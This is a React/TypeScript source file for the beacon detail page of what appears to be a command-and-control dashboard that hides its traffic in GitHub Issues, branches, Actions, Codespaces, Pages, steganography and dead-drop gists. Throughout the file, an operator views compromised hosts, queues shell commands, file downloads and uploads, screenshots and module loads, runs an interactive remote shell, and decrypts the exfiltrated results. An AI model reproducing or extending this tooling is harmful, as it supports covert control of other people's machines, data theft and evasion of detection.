// dashboard/src/pages/BeaconDetailPage.tsx
//
// Beacon detail view: header + Overview / Tasks / Results / Shell tabs.
// Live mode: data from C2ServerClient.
// API mode: basic beacon info from GitHub Issue; task management unavailable.

import { useState, useMemo, useEffect, useRef, useCallback } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';
import { ChevronLeft } from 'lucide-react';
import { useAuth } from '@/context/AuthContext';
import { C2ServerClient } from '@/lib/C2ServerClient';
import type { ServerTask, ModuleInfo, SSEEvent } from '@/lib/C2ServerClient';
import { GitHubApiClient } from '@/lib/GitHubApiClient';
import { parseBeacon } from '@/lib/parseBeacon';
import { getGitHubCoords } from '@/lib/coords';
import { decryptSealedResult, deadDropGistKey } from '@/lib/crypto';
import { BeaconStatusDot } from '@/components/BeaconStatusDot';
import { MaintenancePanel } from '@/components/MaintenancePanel';
import type { Beacon, TentacleId } from '@/types';
import { TENTACLE_NAMES } from '@/types';

// ── Tab type ──────────────────────────────────────────────────────────────────

type Tab = 'overview' | 'maintenance' | 'tasks' | 'results' | 'shell' | 'stealth';

const TASK_KINDS = ['shell', 'sleep', 'die', 'screenshot', 'download', 'upload', 'load-module'] as const;

const KIND_DEFAULT_ARGS: Record<string, string> = {
  shell:         '{"cmd": ""}',
  sleep:         '{"intervalMs": 30000}',
  die:           '{}',
  screenshot:    '{}',
  download:      '{"remotePath": ""}',
  upload:        '{"remotePath": "", "content": ""}',
  'load-module': '{"name": "", "serverUrl": ""}',
};

// ── Relative time helper ──────────────────────────────────────────────────────

function rel(iso: string | null): string {
  if (!iso) return '—';
  const ms = Date.now() - new Date(iso).getTime();
  if (ms < 60_000)     return 'just now';
  if (ms < 3_600_000)  return `${Math.floor(ms / 60_000)}m ago`;
  if (ms < 86_400_000) return `${Math.floor(ms / 3_600_000)}h ago`;
  return `${Math.floor(ms / 86_400_000)}d ago`;
}

// ── Status badge ──────────────────────────────────────────────────────────────

const STATUS_COLOURS: Record<string, string> = {
  pending:   'text-gray-400 border-gray-700',
  delivered: 'text-blue-400 border-blue-800',
  completed: 'text-green-400 border-green-800',
  failed:    'text-red-400 border-red-800',
};

function StatusBadge({ status }: { status: string }) {
  return (
    <span className={`inline-flex items-center gap-1 text-[9px] font-mono border px-1.5 py-0.5 rounded ${STATUS_COLOURS[status] ?? 'text-gray-500 border-gray-800'}`}>
      {status === 'pending' && (
        <span className="w-1.5 h-1.5 rounded-full bg-gray-400 animate-pulse shrink-0" />
      )}
      {status}
    </span>
  );
}

// ── JSON pretty-printer ───────────────────────────────────────────────────────

function JsonOutput({ text }: { text: string }) {
  let parsed: unknown;
  try {
    parsed = JSON.parse(text);
  } catch {
    parsed = undefined;
  }

  if (parsed === undefined) {
    return (
      <pre className="bg-octo-black border border-octo-border rounded p-2 text-[11px] text-gray-300 font-mono whitespace-pre-wrap overflow-auto max-h-32">
        {text}
      </pre>
    );
  }

  const pretty = JSON.stringify(parsed, null, 2);
  // Tokenise: keys, strings, numbers, booleans/null, punctuation
  const tokens = pretty.split(/("(?:[^"\\]|\\.)*"(?:\s*:)?|true|false|null|-?\d+(?:\.\d+)?(?:[eE][+-]?\d+)?)/);

  const nodes = tokens.map((tok, i) => {
    if (tok === '') return null;
    // key: "foo":
    if (/^"[^"]*"\s*:/.test(tok)) {
      return <span key={i} className="text-blue-300">{tok}</span>;
    }
    // string value: "..."
    if (/^"/.test(tok)) {
      return <span key={i} className="text-green-300">{tok}</span>;
    }
    // number
    if (/^-?\d/.test(tok)) {
      return <span key={i} className="text-yellow-300">{tok}</span>;
    }
    // boolean / null
    if (tok === 'true' || tok === 'false' || tok === 'null') {
      return <span key={i} className="text-yellow-300">{tok}</span>;
    }
    return <span key={i} className="text-gray-400">{tok}</span>;
  });

  return (
    <pre className="bg-octo-black border border-octo-border rounded p-2 text-[11px] font-mono whitespace-pre overflow-auto max-h-32">
      {nodes}
    </pre>
  );
}

// ── OverviewPanel ─────────────────────────────────────────────────────────────

function OverviewPanel({ beacon }: { beacon: Beacon | undefined }) {
  if (!beacon) {
    return <p className="text-xs text-gray-600 p-4 font-mono">Loading…</p>;
  }

  const rows: Array<{ label: string; value: string | undefined }> = [
    { label: 'Hostname',   value: beacon.hostname },
    { label: 'Status',     value: beacon.status },
    { label: 'OS',         value: beacon.os },
    { label: 'Arch',       value: beacon.arch },
    { label: 'Username',   value: beacon.username },
    { label: 'Tentacle',   value: beacon.activeTentacle ? TENTACLE_NAMES[beacon.activeTentacle] : undefined },
    { label: 'Last Seen',  value: rel(beacon.lastSeen) },
    { label: 'Version',    value: beacon.version },
    { label: 'Public Key', value: beacon.publicKey ? beacon.publicKey.slice(0, 32) + '…' : undefined },
    { label: 'Tags',       value: beacon.tags?.join(', ') },
  ].filter((r): r is { label: string; value: string } => Boolean(r.value));

  return (
    <div className="p-4 space-y-2">
      {rows.map(({ label, value }) => (
        <div key={label} className="flex gap-3 text-xs font-mono">
          <span className="text-gray-600 w-24 shrink-0">{label}</span>
          <span className="text-gray-300 break-all">{value}</span>
        </div>
      ))}
    </div>
  );
}

// ── LoadedModulesPanel ────────────────────────────────────────────────────────

function LoadedModulesPanel({ beaconId }: { beaconId: string }) {
  const { pat, mode, serverUrl } = useAuth();

  const { data: modules = [] } = useQuery({
    queryKey:        ['modules', beaconId, serverUrl, pat],
    queryFn:         () => new C2ServerClient(serverUrl, pat).listModules(beaconId),
    enabled:         mode === 'live' && pat.length > 0,
    refetchInterval: 30_000,
    staleTime:       10_000,
  });

  if (mode !== 'live') return null;

  return (
    <div className="px-4 pb-4 pt-3 border-t border-octo-border/40">
      <p className="text-[9px] text-gray-600 uppercase tracking-widest mb-2">
        Loaded Modules
      </p>
      {modules.length === 0 ? (
        <p className="text-xs text-gray-700 font-mono">No modules loaded.</p>
      ) : (
        <div className="space-y-1">
          {modules.map((m: ModuleInfo) => (
            <div key={m.name} className="flex items-center justify-between text-xs font-mono">
              <div className="flex items-center gap-2">
                <span className="w-1.5 h-1.5 rounded-full bg-octo-blue/60 shrink-0" />
                <span className="text-gray-300">{m.name}</span>
              </div>
              <span className="text-[10px] text-gray-600">{rel(m.lastExecuted)}</span>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

// ── StealthPanel ──────────────────────────────────────────────────────────────

function StealthPanel({ beacon }: { beacon: Beacon | undefined }) {
  const [gistKey, setGistKey] = useState<string | null>(null);

  useEffect(() => {
    if (!beacon) return;
    void deadDropGistKey(beacon.id).then(setGistKey);
  }, [beacon?.id]);

  if (!beacon) {
    return <p className="text-xs text-gray-600 p-4 font-mono">Loading…</p>;
  }

  const isNotes = beacon.activeTentacle === 11;
  const isRelay = beacon.activeTentacle === 12;

  const rows: Array<{ label: string; value: string }> = [
    { label: 'Active Channel',  value: TENTACLE_NAMES[beacon.activeTentacle] },
    { label: 'Notes Channel',   value: isNotes ? 'Active' : 'Not observed' },
    { label: 'Relay Channel',   value: isRelay ? 'Active' : 'Not configured' },
    { label: 'Dead-drop File',  value: gistKey ? `data-${gistKey}.bin` : 'Computing…' },
  ];

  return (
    <div className="p-4 space-y-2">
      {rows.map(({ label, value }) => (
        <div key={label} className="flex gap-3 text-xs font-mono">
          <span className="text-gray-600 w-32 shrink-0">{label}</span>
          <span
            className={`break-all ${
              value === 'Active' ? 'text-green-400' :
              value === 'Not observed' || value === 'Not configured' ? 'text-gray-600' :
              'text-gray-300'
            }`}
          >
            {value}
          </span>
        </div>
      ))}
    </div>
  );
}

// ── TentacleHealthGrid ────────────────────────────────────────────────────────

// Primary operational channels shown; tentacles 6–8, 10–12 are secondary/recovery channels
const MINI_TENTACLES: Array<{ id: TentacleId; name: string }> = [
  { id: 1, name: 'Issues'     },
  { id: 2, name: 'Branch'     },
  { id: 3, name: 'Actions'    },
  { id: 4, name: 'Codespaces' },
  { id: 5, name: 'Pages'      },
  { id: 9, name: 'Stego'      },
];

function TentacleHealthGrid({ beacon }: { beacon: Beacon | undefined }) {
  if (!beacon) return null;

  return (
    <div className="px-4 pb-4 pt-3 border-t border-octo-border/40">
      <p className="text-[9px] text-gray-600 uppercase tracking-widest mb-2">
        Tentacle Activity
      </p>
      <div className="flex flex-wrap gap-3">
        {MINI_TENTACLES.map(({ id, name }) => {
          const isActive = beacon.activeTentacle === id;
          return (
            <div key={id} className="flex items-center gap-1.5">
              <span
                className={`w-2 h-2 rounded-full shrink-0 ${
                  isActive ? 'bg-green-400' : 'bg-gray-700'
                }`}
              />
              <span className={`text-[10px] font-mono ${isActive ? 'text-green-400' : 'text-gray-600'}`}>
                {name}
              </span>
            </div>
          );
        })}
      </div>
    </div>
  );
}

// ── ResultRow — auto-decrypts when privkey available; falls back to manual input ──

function ResultRow({ task, privkey, onSetPrivkey, onDecrypted }: {
  task:          ServerTask;
  privkey:       string | null;
  onSetPrivkey:  (key: string) => void;
  onDecrypted?:  (taskId: string, text: string) => void;
}) {
  const [decrypted, setDecrypted]  = useState<string | null>(null);
  const [decryptErr, setDecryptErr] = useState<string | null>(null);
  const [keyInput, setKeyInput]    = useState('');
  const [copyFlash, setCopyFlash]  = useState(false);

  const r       = task.result;
  const encData = r?.data ?? '';

  async function doDecrypt(key: string) {
    try {
      const plain = await decryptSealedResult(encData, key);
      setDecrypted(plain);
      setDecryptErr(null);
      onSetPrivkey(key);
      onDecrypted?.(task.taskId, plain);
    } catch {
      setDecryptErr('Decryption failed — check private key');
    }
  }

  // Auto-decrypt when operator privkey is available in AuthContext
  useEffect(() => {
    if (privkey && encData && decrypted === null && decryptErr === null) {
      void doDecrypt(privkey);
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [privkey, encData]);

  // Notify parent about plaintext output on mount (ref-based to fire once)
  const notifiedRef = useRef(false);
  useEffect(() => {
    if (!notifiedRef.current && r?.output && !r?.data) {
      notifiedRef.current = true;
      onDecrypted?.(task.taskId, r.output);
    }
    // Note: intentional — onDecrypted is not stable across renders; task.taskId and r are stable
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [r?.output, r?.data]);

  if (!r) return null;

  // Plaintext gRPC result
  if (r.output && !r.data) {
    return (
      <div className="mt-1">
        <JsonOutput text={r.output} />
      </div>
    );
  }

  // Encrypted (sealed-box) result
  if (r.data) {
    if (decrypted !== null) {
      function handleCopyJson() {
        let text: string;
        try {
          text = JSON.stringify(JSON.parse(decrypted!), null, 2);
        } catch {
          text = decrypted!;
        }
        void navigator.clipboard.writeText(text).then(() => {
          setCopyFlash(true);
          setTimeout(() => setCopyFlash(false), 2000);
        });
      }
      return (
        <div className="mt-1 space-y-1">
          <div className="flex items-center justify-between">
            <span className="text-[10px] text-gray-500 font-mono">Decrypted</span>
            <button
              data-testid="copy-json-btn"
              onClick={handleCopyJson}
              className="text-[10px] px-2 py-0.5 bg-octo-blue/10 border border-octo-blue/30 text-octo-blue rounded hover:bg-octo-blue/20 font-mono"
            >
              {copyFlash ? 'Copied!' : 'Copy JSON'}
            </button>
          </div>
          <JsonOutput text={decrypted} />
        </div>
      );
    }

    if (decryptErr !== null) {
      return (
        <div className="mt-1 space-y-1">
          <p className="text-[10px] text-red-400 font-mono">{decryptErr}</p>
          <div className="flex gap-2">
            <input
              type="password"
              value={keyInput}
              onChange={e => setKeyInput(e.target.value)}
              placeholder="Private key (base64url)"
              className="flex-1 bg-octo-black border border-octo-border rounded px-2 py-1 text-xs font-mono outline-none focus:border-octo-blue/50"
            />
            <button
              onClick={() => void doDecrypt(keyInput)}
              className="text-[10px] px-3 py-1 bg-octo-blue/10 border border-octo-blue/30 text-octo-blue rounded hover:bg-octo-blue/20 font-mono"
            >
              Retry
            </button>
          </div>
        </div>
      );
    }

    if (privkey) {
      return <p className="mt-1 text-[10px] text-gray-600 font-mono">Decrypting…</p>;
    }

    return (
      <div className="mt-1 space-y-1">
        <p className="text-[10px] text-gray-600 font-mono">
          Encrypted result ({r.data.length} bytes) — enter operator private key to decrypt
        </p>
        <div className="flex gap-2">
          <input
            type="password"
            value={keyInput}
            onChange={e => setKeyInput(e.target.value)}
            placeholder="Private key (base64url)"
            className="flex-1 bg-octo-black border border-octo-border rounded px-2 py-1 text-xs font-mono outline-none focus:border-octo-blue/50"
          />
          <button
            onClick={() => void doDecrypt(keyInput)}
            className="text-[10px] px-3 py-1 bg-octo-blue/10 border border-octo-blue/30 text-octo-blue rounded hover:bg-octo-blue/20 font-mono"
          >
            Decrypt
          </button>
        </div>
      </div>
    );
  }

  return null;
}

// ── TaskRow ───────────────────────────────────────────────────────────────────

function TaskRow({ task, privkey, onSetPrivkey, showResult, onRequeue, onDecrypted }: {
  task: ServerTask;
  privkey: string | null;
  onSetPrivkey: (key: string) => void;
  showResult: boolean;
  onRequeue?: (kind: string, args: Record<string, unknown>) => Promise<void>;
  onDecrypted?: (taskId: string, text: string) => void;
}) {
  const [expanded, setExpanded]       = useState(showResult);
  const [requeueBusy, setRequeueBusy] = useState(false);

  async function handleRequeue(e: React.MouseEvent) {
    e.stopPropagation();
    if (!onRequeue) return;
    setRequeueBusy(true);
    try {
      await onRequeue(task.kind, task.args);
    } finally {
      setRequeueBusy(false);
    }
  }

  return (
    <div className="border-b border-octo-border/40 py-2 px-3 text-xs font-mono">
      <div className="flex items-center gap-2 cursor-pointer" onClick={() => setExpanded(e => !e)}>
        <StatusBadge status={task.status} />
        <span className="text-gray-400">{task.kind}</span>
        <span className="text-gray-700 text-[10px] truncate max-w-xs">
          {JSON.stringify(task.args)}
        </span>
        <span className="text-[10px] text-gray-600 shrink-0">{task.taskId}</span>
        <span className="ml-auto text-[10px] text-gray-600 shrink-0">{rel(task.createdAt)}</span>
        {task.status === 'failed' && onRequeue && (
          <button
            aria-label="Re-queue task"
            disabled={requeueBusy}
            onClick={handleRequeue}
            className="ml-1 text-[10px] px-1.5 py-0.5 bg-octo-blue/10 border border-octo-blue/30 text-octo-blue rounded hover:bg-octo-blue/20 transition-colors duration-150 disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {requeueBusy ? (
              <span className="inline-block w-2.5 h-2.5 border border-octo-blue border-t-transparent rounded-full animate-spin" />
            ) : (
              '↺'
            )}
          </button>
        )}
      </div>
      {expanded && (
        <div className="mt-1 pl-1 space-y-0.5 text-[10px] text-gray-600">
          {task.deliveredAt && <p>delivered: {rel(task.deliveredAt)}</p>}
          {task.completedAt && <p>completed: {rel(task.completedAt)}</p>}
          {showResult && task.result && (
            <ResultRow task={task} privkey={privkey} onSetPrivkey={onSetPrivkey} {...(onDecrypted ? { onDecrypted } : {})} />
          )}
        </div>
      )}
    </div>
  );
}

// ── TaskForm ──────────────────────────────────────────────────────────────────

function TaskForm({ onSubmit }: {
  onSubmit: (kind: string, args: Record<string, unknown>) => void;
}) {
  const [kind, setKind]     = useState<string>('shell');
  const [argsStr, setArgs]  = useState(KIND_DEFAULT_ARGS['shell']!);
  const [error, setError]   = useState<string | null>(null);

  function handleKindChange(k: string) {
    setKind(k);
    setArgs(KIND_DEFAULT_ARGS[k] ?? '{}');
    setError(null);
  }

  function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    let args: Record<string, unknown>;
    try {
      args = JSON.parse(argsStr) as Record<string, unknown>;
    } catch {
      setError('Invalid JSON');
      return;
    }
    setError(null);
    onSubmit(kind, args);
  }

  return (
    <form onSubmit={handleSubmit} className="flex items-start gap-2 p-3 border-b border-octo-border/40">
      <select
        value={kind}
        onChange={e => handleKindChange(e.target.value)}
        className="bg-octo-black border border-octo-border rounded px-2 py-1.5 text-xs font-mono text-gray-300 outline-none focus:border-octo-blue/50"
      >
        {TASK_KINDS.map(k => (
          <option key={k} value={k}>{k}</option>
        ))}
      </select>
      <div className="flex-1 space-y-1">
        <input
          type="text"
          value={argsStr}
          onChange={e => setArgs(e.target.value)}
          placeholder="Args JSON"
          className="w-full bg-octo-black border border-octo-border rounded px-2 py-1.5 text-xs font-mono text-gray-300 placeholder:text-gray-700 outline-none focus:border-octo-blue/50"
        />
        {error && <p className="text-[10px] text-red-400 font-mono">{error}</p>}
      </div>
      <button
        type="submit"
        className="px-3 py-1.5 text-[10px] font-mono uppercase tracking-widest bg-octo-blue/10 border border-octo-blue/30 text-octo-blue rounded hover:bg-octo-blue/20 transition-colors duration-150"
      >
        Queue
      </button>
    </form>
  );
}

// ── ShellTab ──────────────────────────────────────────────────────────────────

function ShellTab({ onSubmit }: {
  onSubmit: (kind: string, args: Record<string, unknown>) => void;
}) {
  const [input, setInput]     = useState('');
  const [history, setHistory] = useState<Array<{ id: string; cmd: string }>>([]);
  const inputRef              = useRef<HTMLInputElement>(null);

  function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    const cmd = input.trim();
    if (!cmd) return;
    setHistory(h => [...h, { id: crypto.randomUUID(), cmd }]);
    setInput('');
    onSubmit('shell', { cmd });
    inputRef.current?.focus();
  }

  return (
    <div className="p-3 space-y-2 font-mono">
      <div className="bg-octo-black border border-octo-border rounded p-2 min-h-[4rem] max-h-48 overflow-y-auto space-y-0.5">
        {history.length === 0 ? (
          <p className="text-[10px] text-gray-700">No commands sent yet.</p>
        ) : (
          history.map(({ id, cmd }) => (
            <div key={id} className="text-[11px]">
              <span className="text-octo-blue/60">$ </span>
              <span className="text-gray-300">{cmd}</span>
            </div>
          ))
        )}
      </div>
      <form
        onSubmit={handleSubmit}
        className="flex items-center gap-2 border border-octo-border rounded px-2 py-1.5"
      >
        <span className="text-octo-blue text-xs shrink-0">$</span>
        <input
          ref={inputRef}
          type="text"
          value={input}
          onChange={e => setInput(e.target.value)}
          placeholder="shell command…"
          className="flex-1 bg-transparent text-xs text-gray-300 placeholder:text-gray-700 outline-none"
        />
        <button
          type="submit"
          className="text-[10px] px-2 py-0.5 bg-octo-blue/10 border border-octo-blue/30 text-octo-blue rounded hover:bg-octo-blue/20 transition-colors duration-150"
        >
          Run
        </button>
      </form>
    </div>
  );
}

// ── BeaconDetailPage ──────────────────────────────────────────────────────────

export function BeaconDetailPage() {
  const { id = '' }         = useParams<{ id: string }>();
  const { pat, mode, serverUrl, privkey, setPrivkey } = useAuth();
  const navigate            = useNavigate();
  const queryClient         = useQueryClient();
  const { owner, repo }     = getGitHubCoords();
  const [tab, setTab]           = useState<Tab>('overview');
  const [decryptedMap, setDecryptedMap] = useState<Map<string, string>>(new Map());
  const [copyAllFlash, setCopyAllFlash] = useState(false);
  const copyFlashTimer = useRef<ReturnType<typeof setTimeout> | null>(null);

  // ── Beacon metadata ────────────────────────────────────────────────────────

  const { data: liveBeacons = [] } = useQuery({
    queryKey:  ['beacons-live', serverUrl, pat],
    queryFn:   () => new C2ServerClient(serverUrl, pat).getBeacons(),
    enabled:   mode === 'live' && pat.length > 0,
    staleTime: 30_000,
  });

  const issueNumber = id.startsWith('beacon-') ? parseInt(id.slice(7), 10) : NaN;
  const { data: ghIssue } = useQuery({
    queryKey: ['beacon-detail', issueNumber],
    queryFn:  () => new GitHubApiClient(pat, owner, repo).getBeaconDetail(issueNumber),
    enabled:  mode === 'api' && !isNaN(issueNumber),
    staleTime: 30_000,
  });

  const beacon: Beacon | undefined = useMemo(() => {
    if (mode === 'live') return liveBeacons.find(b => b.id === id);
    if (ghIssue)        return parseBeacon(ghIssue);
    return undefined;
  }, [mode, liveBeacons, id, ghIssue]);

  // ── Tasks / results ────────────────────────────────────────────────────────

  const [resultsLastUpdated, setResultsLastUpdated] = useState<Date | null>(null);

  const { data: tasks = [] } = useQuery({
    queryKey:        ['tasks', id, serverUrl, pat],
    queryFn:         async () => {
      const result = await new C2ServerClient(serverUrl, pat).getResults(id);
      setResultsLastUpdated(new Date());
      return result;
    },
    enabled:         mode === 'live' && pat.length > 0,
    refetchInterval: 15_000,
    staleTime:       10_000,
  });

  const completedTasks = tasks.filter(t => t.status === 'completed' || t.status === 'failed');

  // ── Queue task ─────────────────────────────────────────────────────────────

  const queueMutation = useMutation({
    mutationFn: ({ kind, args }: { kind: string; args: Record<string, unknown> }) =>
      new C2ServerClient(serverUrl, pat).queueTask(id, kind, args),
    onSuccess: () => {
      void queryClient.invalidateQueries({ queryKey: ['tasks', id, serverUrl, pat] });
    },
  });

  function handleQueueTask(kind: string, args: Record<string, unknown>) {
    queueMutation.mutate({ kind, args });
  }

  const handleRequeue = useCallback(async (kind: string, args: Record<string, unknown>) => {
    await new C2ServerClient(serverUrl, pat).queueTask(id, kind, args);
    void queryClient.invalidateQueries({ queryKey: ['tasks', id, serverUrl, pat] });
  }, [serverUrl, pat, id, queryClient]);

  // ── SSE invalidation ──────────────────────────────────────────────────────

  useEffect(() => {
    if (mode !== 'live') return;
    const ctrl = new AbortController();
    void new C2ServerClient(serverUrl, pat).subscribeEvents((event: SSEEvent) => {
      if (event.type === 'beacon-update') {
        if (event.beacons.some(b => b.id === id)) {
          void queryClient.invalidateQueries({ queryKey: ['tasks', id, serverUrl, pat] });
        }
      } else if (event.type === 'task-update' || event.type === 'maintenance-update') {
        if (event.beaconId === id) {
          void queryClient.invalidateQueries({ queryKey: ['tasks', id, serverUrl, pat] });
        }
      }
    }, ctrl.signal);
    return () => ctrl.abort();
  }, [mode, serverUrl, pat, id, queryClient]);

  useEffect(() => () => {
    if (copyFlashTimer.current) clearTimeout(copyFlashTimer.current);
  }, []);

  // ── Render ────────────────────────────────────────────────────────────────

  return (
    <div className="space-y-4 font-mono">

      {/* Back button */}
      <button
        onClick={() => navigate('/')}
        className="flex items-center gap-1 text-[10px] text-gray-600 hover:text-gray-400 transition-colors"
      >
        <ChevronLeft size={11} />
        Beacons
      </button>

      {/* Header */}
      {beacon ? (
        <div className="flex items-center gap-3 flex-wrap">
          <BeaconStatusDot status={beacon.status} />
          <span className="text-sm text-gray-200">{beacon.hostname}</span>
          <span className="text-[11px] text-octo-blue/70">{beacon.id}</span>
          <span className="text-[11px] text-gray-600">{beacon.os}/{beacon.arch}</span>
          {beacon.username && (
            <span className="text-[11px] text-gray-600">{beacon.username}</span>
          )}
          <span className="ml-auto text-[10px] text-gray-700">{rel(beacon.lastSeen)}</span>
        </div>
      ) : (
        <div className="text-xs text-gray-600">{id}</div>
      )}

      {/* Tab bar */}
      <div className="flex gap-0 border-b border-octo-border/60">
        {(['overview', 'maintenance', 'tasks', 'results', 'shell', 'stealth'] as Tab[]).map(t => (
          <button
            key={t}
            onClick={() => setTab(t)}
            className={`px-4 py-1.5 text-xs capitalize border-b-2 transition-colors duration-150 ${
              tab === t
                ? 'border-octo-blue text-octo-blue'
                : 'border-transparent text-gray-600 hover:text-gray-400'
            }`}
          >
            {t}
          </button>
        ))}
      </div>

      {/* Tab content */}
      {tab === 'overview' && (
        <div className="border border-octo-border rounded overflow-hidden">
          <OverviewPanel beacon={beacon} />
          {mode === 'live' && <TentacleHealthGrid beacon={beacon} />}
          <LoadedModulesPanel beaconId={id ?? ''} />
        </div>
      )}

      {tab === 'maintenance' && (
        <div className="border border-octo-border rounded overflow-hidden">
          <MaintenancePanel beaconId={id} />
        </div>
      )}

      {tab === 'tasks' && (
        <div className="border border-octo-border rounded overflow-hidden">
          {mode === 'live' ? (
            <>
              <TaskForm onSubmit={handleQueueTask} />
              {queueMutation.isError && (
                <p className="text-[10px] text-red-400 font-mono px-3 py-1">
                  {(queueMutation.error as Error).message}
                </p>
              )}
              {tasks.length === 0 ? (
                <p className="text-xs text-gray-600 p-4 font-mono">No tasks queued</p>
              ) : (
                tasks.map(task => (
                  <TaskRow
                    key={task.taskId}
                    task={task}
                    privkey={privkey}
                    onSetPrivkey={setPrivkey}
                    showResult={false}
                    onRequeue={handleRequeue}
                  />
                ))
              )}
            </>
          ) : (
            <p className="text-xs text-gray-600 p-4">
              Live mode required for task management
            </p>
          )}
        </div>
      )}

      {tab === 'results' && (
        <div className="border border-octo-border rounded overflow-hidden">
          {mode === 'live' ? (
            <>
              <div className="px-3 py-1.5 border-b border-octo-border/40 flex items-center gap-2">
                <span className="text-[9px] text-gray-600 uppercase tracking-widest">Results</span>
                {decryptedMap.size > 0 && (
                  <button
                    aria-label="Copy all decrypted results"
                    onClick={() => {
                      const text = Array.from(decryptedMap.values()).join('\n\n---\n\n');
                      void navigator.clipboard.writeText(text).then(() => {
                        setCopyAllFlash(true);
                        if (copyFlashTimer.current) clearTimeout(copyFlashTimer.current);
                        copyFlashTimer.current = setTimeout(() => setCopyAllFlash(false), 2000);
                      });
                    }}
                    className="text-[9px] px-2 py-0.5 bg-octo-blue/10 border border-octo-blue/30 text-octo-blue rounded hover:bg-octo-blue/20 font-mono transition-colors duration-150"
                  >
                    {copyAllFlash ? 'Copied!' : 'Copy All'}
                  </button>
                )}
                {resultsLastUpdated && (
                  <span className="ml-auto text-[9px] text-gray-700 font-mono">
                    updated {rel(resultsLastUpdated.toISOString())}
                  </span>
                )}
              </div>
              {completedTasks.length === 0 ? (
                <p className="text-xs text-gray-600 p-4 font-mono">No results yet</p>
              ) : (
                completedTasks.map(task => (
                  <TaskRow
                    key={task.taskId}
                    task={task}
                    privkey={privkey}
                    onSetPrivkey={setPrivkey}
                    showResult={true}
                    onRequeue={handleRequeue}
                    onDecrypted={(tid, text) => setDecryptedMap(prev => new Map(prev).set(tid, text))}
                  />
                ))
              )}
            </>
          ) : (
            <p className="text-xs text-gray-600 p-4">
              Results require Live mode
            </p>
          )}
        </div>
      )}

      {tab === 'shell' && (
        <div className="border border-octo-border rounded overflow-hidden">
          {mode === 'live' ? (
            <ShellTab onSubmit={handleQueueTask} />
          ) : (
            <p className="text-xs text-gray-600 p-4 font-mono">
              Live mode required for shell access
            </p>
          )}
        </div>
      )}

      {tab === 'stealth' && (
        <div className="border border-octo-border rounded overflow-hidden">
          <StealthPanel beacon={beacon} />
        </div>
      )}
    </div>
  );
}
